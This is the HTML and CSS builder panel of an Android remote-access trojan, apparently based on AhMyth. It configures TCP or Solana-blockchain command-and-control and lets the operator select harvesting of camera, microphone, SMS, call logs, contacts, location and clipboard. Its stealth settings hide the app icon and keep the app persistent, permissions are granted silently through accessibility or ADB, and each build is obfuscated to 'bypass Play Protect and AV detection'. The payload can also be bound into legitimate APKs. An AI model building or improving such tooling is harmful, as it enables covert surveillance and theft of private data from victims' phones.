<div class="builder-panel">
    <!-- Server Configuration -->
    <div class="builder-section">
        <h3 class="builder-section__title">
            <i class="server icon"></i>
            Server Configuration
        </h3>
        <div class="builder-form">
            <div class="builder-form__group">
                <label class="builder-form__label">Connection Type</label>
                <div class="connection-type-selector">
                    <label class="connection-type-btn" ng-class="{'connection-type-btn--active': builder.connectionType === 'tcp'}">
                        <input type="radio" name="connectionType" ng-model="builder.connectionType" value="tcp" ng-init="builder.connectionType = builder.connectionType || 'tcp'">
                        <i class="plug icon"></i>
                        <span>TCP/IP</span>
                    </label>
                    <label class="connection-type-btn" ng-class="{'connection-type-btn--active': connectionType === 'blockchain'}">
                        <input type="radio" name="connectionType" ng-model="builder.connectionType" value="blockchain">
                        <i class="linkify icon"></i>
                        <span>Blockchain C2</span>
                    </label>
                </div>
                <span class="builder-form__hint">Choose connection method: Direct TCP/IP or Blockchain-based C2</span>
            </div>
            
            <!-- TCP/IP Configuration -->
            <div ng-show="builder.connectionType === 'tcp'" class="tcp-config">
                <div class="builder-form__group">
                    <label class="builder-form__label">Server IP</label>
                    <div style="display: flex; gap: 8px; align-items: center;">
                        <input type="text" class="builder-form__input" ng-model="builder.srcIP" ng-change="onBuilderSettingChange()" placeholder="192.168.0.227" style="flex: 1;">
                        <button class="btn btn--small" ng-click="saveBuilderSettings()" title="Save settings">
                            <i class="save icon"></i> Save
                        </button>
                        <button class="btn btn--small" ng-click="loadBuilderSettings()" title="Load saved settings">
                            <i class="folder open icon"></i> Load
                        </button>
                    </div>
                    <span class="builder-form__hint">Your public or local IP address</span>
                </div>
                <div class="builder-form__group">
                    <label class="builder-form__label">Port</label>
                    <input type="number" class="builder-form__input" ng-model="builder.srcPort" ng-change="onBuilderSettingChange()" min="1025" max="65535" placeholder="1234">
                    <span class="builder-form__hint">Must match the listening port</span>
                </div>
            </div>
            
            <!-- Blockchain C2 Configuration -->
            <div ng-show="builder.connectionType === 'blockchain'" class="blockchain-config">
                <div class="builder-form__group">
                    <label class="builder-form__label">Blockchain Mode</label>
                    <select class="builder-form__input" ng-model="builder.blockchainChain" ng-init="builder.blockchainChain = builder.blockchainChain || 'solana'">
                        <option value="solana">Solana Memo (recommended)</option>
                        <option value="evm">EVM (legacy)</option>
                    </select>
                    <span class="builder-form__hint">Solana delivers memo-based commands/responses; EVM kept for backwards compatibility.</span>
                </div>
                <div class="builder-form__group">
                    <label class="builder-form__label">RPC URL</label>
                    <input type="text" class="builder-form__input" ng-model="builder.blockchainRpcUrl" placeholder="https://api.devnet.solana.com">
                    <span class="builder-form__hint">Solana RPC endpoint (devnet/mainnet or provider URL)</span>
                </div>
                <div class="builder-form__group">
                    <label class="builder-form__label">Channel / Contract Address</label>
                    <input type="text" class="builder-form__input" ng-model="builder.blockchainContract" placeholder="Solana channel address (base58)">
                    <div class="inline-actions">
                        <button class="btn btn--secondary btn--small" type="button" ng-click="loadBlockchainKeys()">Load</button>
                        <button class="btn btn--secondary btn--small" type="button" ng-click="saveBlockchainKeys()">Save</button>
                    </div>
                    <span class="builder-form__hint">Solana memo channel address (or contract for legacy EVM)</span>
                </div>
                <div class="builder-form__group">
                    <label class="builder-form__label">Block Step</label>
                    <input type="number" class="builder-form__input" ng-model="builder.blockchainBlockStep" min="1" max="100" placeholder="10" ng-init="builder.blockchainBlockStep = builder.blockchainBlockStep || 10">
                    <span class="builder-form__hint">Block interval for endpoint rotation</span>
                </div>
                <div class="builder-form__group">
                    <label class="builder-form__label">Candidates Per Cycle</label>
                    <input type="number" class="builder-form__input" ng-model="builder.blockchainCandidates" min="1" max="20" placeholder="5" ng-init="builder.blockchainCandidates = builder.blockchainCandidates || 5">
                    <span class="builder-form__hint">Number of endpoint candidates per rotation</span>
                </div>
                <div class="builder-form__group">
                    <label class="builder-form__label">AES Key (Hex, 64 chars)</label>
                    <div class="inline-actions">
                        <input type="text" class="builder-form__input" ng-model="builder.blockchainC2AesKey" placeholder="0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef" maxlength="64">
                        <button class="btn btn--secondary btn--small" type="button" ng-click="generateAesKey()">Generate AES</button>
                    </div>
                    <span class="builder-form__hint">32-byte AES key in hexadecimal format</span>
                </div>
                <div class="builder-form__group">
                    <label class="builder-form__label">Operator Private Key</label>
                    <input type="text" class="builder-form__input" ng-model="builder.blockchainOperatorPrivateKey" placeholder="Base58 (Solana) or 0x... (EVM)" autocomplete="off">
                    <div class="inline-actions">
                        <button class="btn btn--secondary btn--small" type="button" ng-click="generateOperatorKey()">Generate</button>
                        <button class="btn btn--secondary btn--small" type="button" ng-click="loadBlockchainKeys()">Load</button>
                        <button class="btn btn--secondary btn--small" type="button" ng-click="saveBlockchainKeys()">Save</button>
                    </div>
                    <span class="builder-form__hint">Funds commands/contract deploys; keep secret.</span>
                </div>
                <div class="builder-form__group">
                    <label class="builder-form__label">Client Private Key (responses)</label>
                    <input type="text" class="builder-form__input" ng-model="builder.blockchainClientPrivateKey" placeholder="Base58 64-byte secret (Solana) or 0x..." autocomplete="off">
                    <div class="inline-actions">
                        <button class="btn btn--secondary btn--small" type="button" ng-click="generateClientKey()">Generate</button>
                        <button class="btn btn--secondary btn--small" type="button" ng-click="loadBlockchainKeys()">Load</button>
                        <button class="btn btn--secondary btn--small" type="button" ng-click="saveBlockchainKeys()">Save</button>
                    </div>
                    <span class="builder-form__hint">Injected so the client can post responses to the blockchain (fund with SOL).</span>
                </div>
                <div class="builder-form__group">
                    <label class="builder-form__label">RPC Fallbacks (comma separated)</label>
                    <input type="text" class="builder-form__input" ng-model="builder.blockchainRpcFallbacks" placeholder="https://api.devnet.solana.com, https://solana-devnet.g.alchemy.com/v2/KEY">
                    <span class="builder-form__hint">Used by builder/tests if the primary RPC is down or rate-limited.</span>
                </div>
                <div class="balance-row">
                    <div class="balance-card">
                        <div class="balance-label">Operator</div>
                        <div class="balance-value">{{builder.blockchainOperatorBalance || 'Balance N/A'}}</div>
                        <div class="balance-address">{{blockchainOperatorAddress || 'Not set'}}</div>
                    </div>
                    <div class="balance-card">
                        <div class="balance-label">Client</div>
                        <div class="balance-value">{{builder.blockchainClientBalance || 'Balance N/A'}}</div>
                        <div class="balance-address">{{blockchainClientAddress || 'Not set'}}</div>
                    </div>
                    <div class="balance-card">
                        <div class="balance-label">Channel</div>
                        <div class="balance-value">{{builder.blockchainChannelBalance || 'Balance N/A'}}</div>
                        <div class="balance-address">{{builder.blockchainContract || 'Not set'}}</div>
                    </div>
                </div>
                <div class="blockchain-actions">
                    <button class="btn btn--secondary btn--small" type="button" ng-click="refreshBlockchainBalances()">Refresh Balances</button>
                    <button class="btn btn--secondary btn--small" type="button" ng-click="runRpcSmokeTest()">Fast RPC Test</button>
                    <button class="btn btn--secondary btn--small" type="button" ng-click="deployBlockchainContract()" ng-disabled="blockchainChain !== 'evm'">Deploy Contract</button>
                    <button class="btn btn--secondary btn--small" type="button" ng-click="loadBlockchainKeys()">Load All Blockchain Settings</button>
                    <button class="btn btn--secondary btn--small" type="button" ng-click="generateOperatorKey()">New Operator Key</button>
                </div>
                <div class="info-box" style="padding: 12px; background: rgba(33, 150, 243, 0.1); border-left: 3px solid #2196F3; margin-top: 8px;">
                    <p style="margin: 0; font-size: 12px; color: var(--text-primary);">
                        <i class="info circle icon"></i> <strong>Blockchain C2:</strong> Uses Solana memos to send/receive commands. Lab modules and client list honour both TCP/IP and Blockchain paths; falls back to TCP/IP if unavailable.
                    </p>
                </div>
            </div>
        </div>
    </div>

    <!-- Permissions -->
    <div class="builder-section">
        <h3 class="builder-section__title">
            <i class="shield icon"></i>
            Permissions & Features
        </h3>
        <div class="section-header-actions">
            <p class="builder-section__desc">Select which features to enable in the payload</p>
            <div class="select-actions">
                <button class="btn btn--small btn--secondary" ng-click="selectAllPermissions()">Select All</button>
                <button class="btn btn--small btn--secondary" ng-click="deselectAllPermissions()">Deselect All</button>
            </div>
        </div>
        
        <div class="permissions-grid">
            <label class="permission-item" ng-class="{'permission-item--checked': permissions.camera}">
                <input type="checkbox" ng-model="permissions.camera" id="Permissions1" value="CameraPer">
                <i class="camera icon"></i>
                <span>Camera</span>
            </label>
            <label class="permission-item" ng-class="{'permission-item--checked': permissions.storage}">
                <input type="checkbox" ng-model="permissions.storage" id="Permissions2" value="StoragePer">
                <i class="folder icon"></i>
                <span>Storage</span>
            </label>
            <label class="permission-item" ng-class="{'permission-item--checked': permissions.microphone}">
                <input type="checkbox" ng-model="permissions.microphone" id="Permissions3" value="MicPer">
                <i class="microphone icon"></i>
                <span>Microphone</span>
            </label>
            <label class="permission-item" ng-class="{'permission-item--checked': permissions.location}">
                <input type="checkbox" ng-model="permissions.location" id="Permissions4" value="LocationPer">
                <i class="map marker alternate icon"></i>
                <span>Location</span>
            </label>
            <label class="permission-item" ng-class="{'permission-item--checked': permissions.contacts}">
                <input type="checkbox" ng-model="permissions.contacts" id="Permissions5" value="ContactsPer">
                <i class="address book icon"></i>
                <span>Contacts</span>
            </label>
            <label class="permission-item" ng-class="{'permission-item--checked': permissions.sms}">
                <input type="checkbox" ng-model="permissions.sms" id="Permissions6" value="SMSPer">
                <i class="comment icon"></i>
                <span>SMS</span>
            </label>
            <label class="permission-item" ng-class="{'permission-item--checked': permissions.callLogs}">
                <input type="checkbox" ng-model="permissions.callLogs" id="Permissions7" value="CallsLogsPer">
                <i class="phone icon"></i>
                <span>Call Logs</span>
            </label>
            <label class="permission-item" ng-class="{'permission-item--checked': permissions.wifi}">
                <input type="checkbox" ng-model="permissions.wifi" id="Permissions8" value="WifiPer" ng-init="permissions.wifi = true">
                <i class="wifi icon"></i>
                <span>WiFi Info</span>
            </label>
            <label class="permission-item" ng-class="{'permission-item--checked': permissions.accounts}">
                <input type="checkbox" ng-model="permissions.accounts" id="Permissions9" value="AccountsPer">
                <i class="users icon"></i>
                <span>Accounts</span>
            </label>
            <label class="permission-item" ng-class="{'permission-item--checked': permissions.phoneCall}">
                <input type="checkbox" ng-model="permissions.phoneCall" id="Permissions10" value="PhoneCallPer">
                <i class="phone volume icon"></i>
                <span>Phone Call</span>
            </label>
            <label class="permission-item" ng-class="{'permission-item--checked': permissions.screenCapture}">
                <input type="checkbox" ng-model="permissions.screenCapture" id="Permissions11" value="ScreenCapturePer">
                <i class="desktop icon"></i>
                <span>Screen</span>
            </label>
            <label class="permission-item" ng-class="{'permission-item--checked': permissions.notifications}">
                <input type="checkbox" ng-model="permissions.notifications" id="Permissions12" value="NotificationsPer">
                <i class="bell icon"></i>
                <span>Notifications</span>
            </label>
            <label class="permission-item" ng-class="{'permission-item--checked': permissions.clipboard}">
                <input type="checkbox" ng-model="permissions.clipboard" id="Permissions13" value="ClipboardPer">
                <i class="clipboard icon"></i>
                <span>Clipboard</span>
            </label>
            <label class="permission-item" ng-class="{'permission-item--checked': permissions.apps}">
                <input type="checkbox" ng-model="permissions.apps" id="Permissions14" value="AppsPer">
                <i class="th icon"></i>
                <span>Apps List</span>
            </label>
            <label class="permission-item" ng-class="{'permission-item--checked': permissions.browser}">
                <input type="checkbox" ng-model="permissions.browser" id="Permissions15" value="BrowserPer">
                <i class="globe icon"></i>
                <span>Browser</span>
            </label>
            <label class="permission-item" ng-class="{'permission-item--checked': permissions.usageStats}">
                <input type="checkbox" ng-model="permissions.usageStats" id="Permissions16" value="UsageStatsPer">
                <i class="chart bar icon"></i>
                <span>App Usage</span>
            </label>
        </div>
        
        <div class="permissions-count">
            <i class="check circle icon"></i>
            <span>{{getSelectedPermissionsCount()}} features selected</span>
        </div>
    </div>

    <!-- Stealth Options -->
    <div class="builder-section">
        <h3 class="builder-section__title">
            <i class="eye slash icon"></i>
            Stealth Options
        </h3>
        <p class="builder-section__desc">Configure how the app hides itself on the device</p>
        
        <div class="stealth-grid">
            <label class="stealth-item">
                <input type="checkbox" ng-model="stealthOptions.hideIcon" id="hideIcon">
                <span>Hide App Icon</span>
                <small>Remove from launcher</small>
            </label>
            <label class="stealth-item">
                <input type="checkbox" ng-model="stealthOptions.hideFromRecents" id="hideRecents">
                <span>Hide from Recents</span>
                <small>Exclude from app switcher</small>
            </label>
            <label class="stealth-item">
                <input type="checkbox" ng-model="stealthOptions.startOnBoot" id="startBoot" checked>
                <span>Start on Boot</span>
                <small>Auto-start after restart</small>
            </label>
            <label class="stealth-item">
                <input type="checkbox" ng-model="stealthOptions.silentNotification" id="silentNotif">
                <span>Silent Mode</span>
                <small>Minimal notification</small>
            </label>
            <label class="stealth-item">
                <input type="checkbox" ng-model="stealthOptions.persistentService" id="persistent" checked>
                <span>Persistent</span>
                <small>Auto-restart if killed</small>
            </label>
            <label class="stealth-item">
                <input type="checkbox" ng-model="stealthOptions.wakelock" id="wakelock" checked>
                <span>Wake Lock</span>
                <small>Keep running in background</small>
            </label>
        </div>
        
        <div class="stealth-note">
            <i class="info circle icon"></i>
            Dial <strong>*#*#1337#*#*</strong> to unhide the app on the target device
        </div>
    </div>

    <!-- Silent Permissions -->
    <div class="builder-section">
        <h3 class="builder-section__title">
            <i class="magic icon"></i>
            Silent Permissions
        </h3>
        <p class="builder-section__desc">Methods to automatically grant permissions without user interaction</p>
        
        <div class="silent-perm-grid">
            <label class="silent-perm-item">
                <input type="checkbox" ng-model="silentPermOptions.generateAdbScript" id="genAdbScript" checked>
                <span>Generate ADB Script</span>
                <small>Creates a script to grant all permissions via ADB</small>
            </label>
            <label class="silent-perm-item">
                <input type="checkbox" ng-model="silentPermOptions.skipPrompts" id="skipPrompts">
                <span>Skip Permission Prompts</span>
                <small>Request permissions silently (may not show dialogs)</small>
            </label>
            <label class="silent-perm-item">
                <input type="checkbox" ng-model="silentPermOptions.useAccessibility" id="useAccessibility">
                <span>Auto-Grant Service</span>
                <small>Use accessibility to auto-tap grant buttons</small>
            </label>
            <label class="silent-perm-item">
                <input type="checkbox" ng-model="silentPermOptions.deviceOwner" id="deviceOwner">
                <span>Device Owner Mode</span>
                <small>Full control if provisioned as device owner</small>
            </label>
        </div>
        
        <div class="silent-perm-info">
            <i class="lightbulb icon"></i>
            <div>
                <strong>ADB Command (after install):</strong>
                <code>adb shell pm grant ahmyth.mine.king.ahmyth &lt;permission&gt;</code>
            </div>
        </div>
    </div>

    <!-- Obfuscation -->
    <div class="builder-section">
        <h3 class="builder-section__title">
            <i class="shield alternate icon"></i>
            Obfuscation & Anti-Detection
        </h3>
        <p class="builder-section__desc">Make each build unique to bypass Play Protect and AV detection</p>
        
        <div class="obfuscation-grid">
            <label class="obfuscation-item">
                <input type="checkbox" ng-model="obfuscationOptions.randomizePackage" id="randPkg" checked>
                <span>Randomize Package Name</span>
                <small>Generate unique package identifier</small>
            </label>
            <label class="obfuscation-item">
                <input type="checkbox" ng-model="obfuscationOptions.randomizeAppName" id="randApp" checked>
                <span>Randomize App Name</span>
                <small>Generate innocent-looking app name</small>
            </label>
            <label class="obfuscation-item">
                <input type="checkbox" ng-model="obfuscationOptions.injectJunk" id="injectJunk" checked>
                <span>Inject Junk Code</span>
                <small>Add random unused classes</small>
            </label>
            <label class="obfuscation-item">
                <input type="checkbox" ng-model="obfuscationOptions.randomizeVersion" id="randVer" checked>
                <span>Randomize Version</span>
                <small>Unique version code each build</small>
            </label>
            <label class="obfuscation-item">
                <input type="checkbox" ng-model="obfuscationOptions.addMetadata" id="addMeta" checked>
                <span>Add Random Metadata</span>
                <small>Include random asset files</small>
            </label>
            <label class="obfuscation-item">
                <input type="checkbox" ng-model="obfuscationOptions.modifySignature" id="modSig" checked>
                <span>Unique Build Signature</span>
                <small>Different hash each build</small>
            </label>
        </div>
        
        <div class="obfuscation-custom">
            <div class="custom-field">
                <label>Custom Package Name (optional)</label>
                <input type="text" ng-model="obfuscationOptions.customPackage" placeholder="e.g., com.google.backup">
            </div>
            <div class="custom-field">
                <label>Custom App Name (optional)</label>
                <input type="text" ng-model="obfuscationOptions.customAppName" placeholder="e.g., System Service">
            </div>
        </div>
        
        <div class="obfuscation-preview" ng-if="obfuscationOptions.randomizePackage || obfuscationOptions.randomizeAppName">
            <i class="eye icon"></i>
            <span>Preview: <strong>{{previewPackage || 'com.google.service'}}</strong> / <strong>{{previewAppName || 'System Helper'}}</strong></span>
            <button class="btn btn--small" ng-click="regeneratePreview()">
                <i class="sync icon"></i> Regenerate
            </button>
        </div>
    </div>

    <!-- Bind APK -->
    <div class="builder-section">
        <h3 class="builder-section__title">
            <i class="linkify icon"></i>
            APK Binding
        </h3>
        
        <label class="bind-toggle">
            <input type="checkbox" ng-model="bindApk.enable" name="bind">
            <span class="bind-toggle__switch"></span>
            <span class="bind-toggle__label">Bind payload with existing APK</span>
        </label>

        <div ng-show="bindApk.enable" class="bind-options">
            <div class="bind-method">
                <label class="builder-form__label">Injection Method</label>
                <div class="method-buttons">
                    <label class="method-btn" ng-class="{'method-btn--active': bindApk.method === 'BOOT'}">
                        <input type="radio" name="method" ng-model="bindApk.method" value="BOOT">
                        <span>Boot</span>
                    </label>
                    <label class="method-btn" ng-class="{'method-btn--active': bindApk.method === 'ACTIVITY'}">
                        <input type="radio" name="method" ng-model="bindApk.method" value="ACTIVITY">
                        <span>Activity</span>
                    </label>
                </div>
            </div>

            <button class="btn btn--secondary" ng-click="clearLogs(); BrowseApk()" ng-disabled="!bindApk.enable">
                <i class="android icon"></i>
                Browse APK
            </button>
            <span class="selected-file" ng-if="filePath">{{fileName}}</span>
        </div>
    </div>

    <!-- Build Progress -->
    <div class="builder-section" ng-if="buildInProgress">
        <div class="build-progress-container">
            <div class="build-progress-header">
                <span class="build-progress-title">
                    <i class="spinner loading icon" ng-if="buildInProgress"></i>
                    <i class="check circle icon" ng-if="buildComplete && !buildInProgress"></i>
                    <i class="times circle icon" ng-if="buildError && !buildInProgress"></i>
                    {{buildStatus || 'Building APK...'}}
                </span>
                <span class="build-progress-percent" ng-if="buildPercent >= 0">{{buildPercent}}%</span>
            </div>
            <div class="build-progress-bar">
                <div class="build-progress-bar__fill" ng-style="{'width': (buildPercent >= 0 ? buildPercent : 0) + '%'}" 
                     ng-class="{'build-progress-bar__fill--complete': buildComplete, 'build-progress-bar__fill--error': buildError}"></div>
            </div>
            <div class="build-progress-steps" ng-if="buildSteps && buildSteps.length > 0">
                <div class="build-step" ng-repeat="step in buildSteps" 
                     ng-class="{'build-step--active': step.active, 'build-step--complete': step.complete, 'build-step--error': step.error}">
                    <i class="circle icon" ng-if="!step.complete && !step.error"></i>
                    <i class="check circle icon" ng-if="step.complete"></i>
                    <i class="times circle icon" ng-if="step.error"></i>
                    <span>{{step.label}}</span>
                </div>
            </div>
        </div>
    </div>

    <!-- Build Actions -->
    <div class="builder-actions">
        <button class="build-btn" 
                ng-click="clearLogs(); BuildWithCurrentValues()" 
                ng-disabled="buildInProgress || (connectionType === 'tcp' && (!srcIP || !srcPort)) || (connectionType === 'blockchain' && (!blockchainRpcUrl || !blockchainC2AesKey || (blockchainC2AesKey && blockchainC2AesKey.length !== 64) || !blockchainClientPrivateKey || blockchainClientPrivateKey.length < 60)) || (bindApk.enable && !filePath)">
            <i class="hammer icon"></i>
            <span ng-if="!bindApk.enable">Build APK</span>
            <span ng-if="bindApk.enable">Bind & Build</span>
        </button>
        
        <button class="btn btn--secondary btn--lg" 
                ng-click="installAndRun()" 
                ng-disabled="!lastBuiltApkPath"
                title="Install, grant permissions, and run on connected device">
            <i class="play icon"></i>
            Install & Run
        </button>
        
        <button class="btn btn--danger btn--lg" 
                ng-click="uninstallApp()" 
                title="Uninstall AndroThreat from connected device">
            <i class="trash icon"></i>
            Uninstall
        </button>
    </div>

    <!-- Built APKs List -->
    <div class="builder-section" ng-init="refreshPayloads()">
        <h3 class="builder-section__title">
            <i class="archive icon"></i>
            Built APKs
            <button class="btn btn--small btn--secondary" ng-click="refreshPayloads()" style="margin-left: auto;">
                <i class="sync icon"></i> Refresh
            </button>
        </h3>
        
        <div class="apk-list" ng-if="builtPayloads.length > 0">
            <div class="apk-item" ng-repeat="payload in builtPayloads track by payload.name">
                <div class="apk-info">
                    <div class="apk-name">
                        <i class="android icon"></i>
                        {{payload.name}}
                    </div>
                    <div class="apk-meta">
                        <span class="apk-size">{{payload.size}}</span>
                        <span class="apk-date">{{formatDate(payload.date)}}</span>
                    </div>
                </div>
                <div class="apk-actions">
                    <button class="btn btn--small btn--primary" ng-click="installApk(payload.path)" title="Install on device">
                        <i class="download icon"></i> Install
                    </button>
                    <button class="btn btn--small btn--secondary" ng-click="copyPayloadPath(payload)" title="Copy path">
                        <i class="copy icon"></i>
                    </button>
                    <button class="btn btn--small btn--danger" ng-click="deletePayload(payload)" title="Delete">
                        <i class="trash icon"></i>
                    </button>
                </div>
            </div>
        </div>
        
        <div class="apk-empty" ng-if="builtPayloads.length === 0">
            <i class="inbox icon"></i>
            <p>No APKs built yet. Build your first payload above!</p>
        </div>
    </div>
</div>

<style>
    .builder-panel {
        max-width: 700px;
        margin: 0 auto;
        padding: 16px;
    }
    
    .builder-actions {
        display: flex;
        justify-content: center;
        gap: 16px;
        padding: 16px 0;
    }
    
    .btn--lg {
        padding: 12px 24px;
        font-size: 14px;
    }
    
    .builder-section {
        margin-bottom: 16px;
        padding: 16px;
        background: var(--bg-secondary);
        border: 1px solid var(--border-color);
        border-radius: 8px;
    }
    
    .builder-section__title {
        display: flex;
        align-items: center;
        gap: 8px;
        margin: 0 0 12px;
        font-size: 14px;
        font-weight: 600;
        color: var(--text-primary);
    }
    
    .builder-section__title i {
        color: var(--accent-primary);
    }
    
    .builder-section__desc {
        margin: 0 0 12px;
        font-size: 12px;
        color: var(--text-secondary);
    }
    
    /* Form */
    .builder-form {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 12px;
    }
    
    .builder-form__group {
        display: flex;
        flex-direction: column;
        gap: 4px;
    }
    
    .builder-form__label {
        font-size: 11px;
        font-weight: 500;
        color: var(--text-secondary);
        text-transform: uppercase;
    }
    
    .builder-form__input {
        padding: 8px 10px;
        background: var(--bg-primary);
        border: 1px solid var(--border-color);
        border-radius: 6px;
        color: var(--text-primary);
        font-size: 13px;
        font-family: var(--font-mono);
    }
    
    .builder-form__input:focus {
        outline: none;
        border-color: var(--accent-primary);
    }
    
    .builder-form__hint {
        font-size: 11px;
        color: var(--text-muted);
    }
    
    /* Section Header Actions */
    .section-header-actions {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-bottom: 12px;
    }
    
    .section-header-actions .builder-section__desc {
        margin: 0;
    }
    
    .select-actions {
        display: flex;
        gap: 6px;
    }
    
    .btn--small {
        padding: 4px 10px;
        font-size: 10px;
        border-radius: 4px;
    }
    
    /* Permissions */
    .permissions-grid {
        display: grid;
        grid-template-columns: repeat(4, 1fr);
        gap: 8px;
    }
    
    .permission-item {
        display: flex;
        align-items: center;
        gap: 6px;
        padding: 10px 12px;
        background: var(--bg-primary);
        border: 1px solid var(--border-color);
        border-radius: 6px;
        cursor: pointer;
        font-size: 11px;
        color: var(--text-secondary);
        transition: all 0.15s ease;
    }
    
    .permission-item:hover {
        border-color: var(--accent-primary);
        background: var(--bg-tertiary);
    }
    
    .permission-item--checked {
        border-color: var(--accent-primary);
        background: rgba(88, 166, 255, 0.1);
    }
    
    .permission-item--checked span {
        color: var(--accent-primary);
        font-weight: 500;
    }
    
    .permission-item--checked i {
        color: var(--accent-primary) !important;
    }
    
    .permission-item input[type="checkbox"] {
        width: 14px;
        height: 14px;
        accent-color: var(--accent-primary);
        flex-shrink: 0;
    }
    
    .permission-item i {
        font-size: 14px;
        color: var(--text-muted);
        flex-shrink: 0;
    }
    
    .permission-item span {
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
    }
    
    .permissions-count {
        display: flex;
        align-items: center;
        gap: 6px;
        margin-top: 12px;
        padding: 8px 12px;
        background: rgba(88, 166, 255, 0.1);
        border-radius: 6px;
        font-size: 11px;
        color: var(--accent-primary);
    }
    
    .permissions-count i {
        font-size: 14px;
    }
    
    /* Stealth */
    .stealth-grid {
        display: grid;
        grid-template-columns: repeat(3, 1fr);
        gap: 8px;
    }
    
    .stealth-item {
        display: flex;
        flex-direction: column;
        gap: 4px;
        padding: 10px 12px;
        background: var(--bg-primary);
        border: 1px solid var(--border-color);
        border-radius: 6px;
        cursor: pointer;
        position: relative;
        transition: all 0.15s ease;
    }
    
    .stealth-item:hover {
        border-color: var(--accent-primary);
        background: var(--bg-tertiary);
    }
    
    .stealth-item input[type="checkbox"] {
        position: absolute;
        top: 10px;
        right: 10px;
        width: 14px;
        height: 14px;
        accent-color: var(--accent-primary);
    }
    
    .stealth-item:has(input:checked) {
        border-color: var(--accent-primary);
        background: rgba(88, 166, 255, 0.1);
    }
    
    .stealth-item:has(input:checked) span {
        color: var(--accent-primary);
    }
    
    .stealth-item span {
        font-size: 12px;
        font-weight: 500;
        color: var(--text-primary);
        padding-right: 20px;
    }
    
    .stealth-item small {
        font-size: 10px;
        color: var(--text-muted);
    }
    
    .stealth-note {
        display: flex;
        align-items: center;
        gap: 8px;
        margin-top: 12px;
        padding: 10px 12px;
        background: var(--bg-primary);
        border-radius: 6px;
        font-size: 12px;
        color: var(--text-secondary);
    }
    
    .stealth-note i {
        color: var(--accent-info);
    }
    
    .stealth-note strong {
        color: var(--text-primary);
        font-family: var(--font-mono);
    }
    
    /* Silent Permissions */
    .silent-perm-grid {
        display: grid;
        grid-template-columns: repeat(2, 1fr);
        gap: 10px;
    }
    
    .silent-perm-item {
        display: flex;
        flex-direction: column;
        padding: 12px;
        background: var(--bg-primary);
        border: 1px solid var(--border-color);
        border-radius: 6px;
        cursor: pointer;
        transition: all 0.2s;
        position: relative;
    }
    
    .silent-perm-item:hover {
        border-color: var(--accent-warning);
        background: var(--bg-tertiary);
    }
    
    .silent-perm-item input {
        position: absolute;
        top: 12px;
        right: 12px;
        width: 14px;
        height: 14px;
        accent-color: var(--accent-warning);
    }
    
    .silent-perm-item:has(input:checked) {
        border-color: var(--accent-warning);
        background: rgba(210, 153, 34, 0.1);
    }
    
    .silent-perm-item:has(input:checked) span {
        color: var(--accent-warning);
    }
    
    .silent-perm-item span {
        font-size: 12px;
        font-weight: 500;
        color: var(--text-primary);
        margin-bottom: 2px;
        padding-right: 20px;
    }
    
    .silent-perm-item small {
        font-size: 10px;
        color: var(--text-muted);
    }
    
    .silent-perm-info {
        display: flex;
        align-items: flex-start;
        gap: 10px;
        margin-top: 12px;
        padding: 12px;
        background: rgba(210, 153, 34, 0.1);
        border: 1px solid rgba(210, 153, 34, 0.3);
        border-radius: 6px;
    }
    
    .silent-perm-info i {
        color: var(--accent-warning);
        margin-top: 2px;
    }
    
    .silent-perm-info code {
        display: block;
        margin-top: 6px;
        padding: 6px 10px;
        background: var(--bg-primary);
        border-radius: 4px;
        font-size: 11px;
        font-family: var(--font-mono);
        color: var(--text-secondary);
    }
    
    /* Obfuscation */
    .obfuscation-grid {
        display: grid;
        grid-template-columns: repeat(3, 1fr);
        gap: 10px;
    }
    
    .obfuscation-item {
        display: flex;
        flex-direction: column;
        padding: 12px;
        background: var(--bg-primary);
        border: 1px solid var(--border-color);
        border-radius: 6px;
        cursor: pointer;
        transition: all 0.2s;
        position: relative;
    }
    
    .obfuscation-item:hover {
        border-color: var(--accent-success);
        background: var(--bg-tertiary);
    }
    
    .obfuscation-item input {
        position: absolute;
        top: 12px;
        right: 12px;
        width: 14px;
        height: 14px;
        accent-color: var(--accent-success);
    }
    
    .obfuscation-item:has(input:checked) {
        border-color: var(--accent-success);
        background: rgba(63, 185, 80, 0.1);
    }
    
    .obfuscation-item:has(input:checked) span {
        color: var(--accent-success);
    }
    
    .obfuscation-item span {
        font-size: 12px;
        font-weight: 500;
        color: var(--text-primary);
        margin-bottom: 2px;
        padding-right: 20px;
    }
    
    .obfuscation-item small {
        font-size: 10px;
        color: var(--text-muted);
    }
    
    .obfuscation-custom {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 12px;
        margin-top: 12px;
        padding-top: 12px;
        border-top: 1px solid var(--border-color);
    }
    
    .custom-field label {
        display: block;
        font-size: 11px;
        color: var(--text-secondary);
        margin-bottom: 4px;
    }
    
    .custom-field input {
        width: 100%;
        padding: 8px 10px;
        background: var(--bg-primary);
        border: 1px solid var(--border-color);
        border-radius: 6px;
        color: var(--text-primary);
        font-size: 12px;
    }
    
    .custom-field input:focus {
        outline: none;
        border-color: var(--accent-success);
    }
    
    .obfuscation-preview {
        display: flex;
        align-items: center;
        gap: 10px;
        margin-top: 12px;
        padding: 10px 12px;
        background: rgba(63, 185, 80, 0.1);
        border: 1px solid rgba(63, 185, 80, 0.3);
        border-radius: 6px;
        font-size: 12px;
        color: var(--text-secondary);
    }
    
    .obfuscation-preview i {
        color: var(--accent-success);
    }
    
    .obfuscation-preview strong {
        color: var(--accent-success);
        font-family: var(--font-mono);
    }
    
    /* Bind */
    .bind-toggle {
        display: flex;
        align-items: center;
        gap: 10px;
        cursor: pointer;
    }
    
    .bind-toggle input {
        display: none;
    }
    
    .bind-toggle__switch {
        width: 36px;
        height: 20px;
        background: var(--bg-tertiary);
        border-radius: 10px;
        position: relative;
        transition: background 0.2s;
    }
    
    .bind-toggle__switch::after {
        content: '';
        position: absolute;
        width: 16px;
        height: 16px;
        background: var(--text-muted);
        border-radius: 50%;
        top: 2px;
        left: 2px;
        transition: all 0.2s;
    }
    
    .bind-toggle input:checked + .bind-toggle__switch {
        background: var(--accent-primary);
    }
    
    .bind-toggle input:checked + .bind-toggle__switch::after {
        left: 18px;
        background: #fff;
    }
    
    .bind-toggle__label {
        font-size: 13px;
        color: var(--text-primary);
    }
    
    .bind-options {
        margin-top: 12px;
        padding-top: 12px;
        border-top: 1px solid var(--border-color);
    }
    
    .bind-method {
        margin-bottom: 12px;
    }
    
    .method-buttons {
        display: flex;
        gap: 8px;
